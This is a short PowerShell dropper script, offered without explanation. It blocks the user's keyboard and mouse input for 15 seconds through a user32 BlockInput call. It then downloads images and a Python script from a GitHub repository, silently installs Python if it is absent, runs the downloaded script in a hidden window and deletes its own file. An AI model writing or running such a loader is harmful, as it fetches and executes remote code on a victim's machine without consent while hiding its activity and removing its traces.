 $cCode = @"
using System;
using System.Runtime.InteropServices;
public class UserInput {
[DllImport("user32.dll")]
public static extern bool BlockInput(bool block);
public static void DisableInput(int ms) {
BlockInput(true);
System.Threading.Thread.Sleep(ms * 1000);
BlockInput(false);
}
}
"@
Add-Type -TypeDefinition $cCode -Language CSharp
[UserInput]::DisableInput(15)
Invoke-WebRequest -Uri "https://github.com/M4rc333l/trycatchme/raw/main/Patrick1.png" -OutFile "Patrick1.png"
Invoke-WebRequest -Uri "https://github.com/M4rc333l/trycatchme/raw/main/Patrick2.png" -OutFile "Patrick2.png"
Invoke-WebRequest -Uri "https://github.com/M4rc333l/trycatchme/raw/main/Spongebob.png" -OutFile "Spongebob.png"
Invoke-WebRequest -Uri "https://github.com/M4rc333l/trycatchme/raw/main/TryCatchMe.py" -OutFile "script.py"
$p = &{python -V} 2>&1
$version = if($p -is [System.Management.Automation.ErrorRecord]) { Invoke-WebRequest -Uri "https://www.python.org/ftp/python/3.11.4/python-3.11.4-amd64.exe" -OutFile "Python-Install.exe"; Start-Process "Python-Install.exe" -ArgumentList "/passive InstallAllUsers=0 PrependPath=1" -Wait; Remove-Item "Python-Install.exe"; Start-Process python.exe -ArgumentList "script.py" -WindowStyle Hidden} else { Start-Process python.exe -ArgumentList "script.py" -WindowStyle Hidden }
Remove-Item "t.ps1"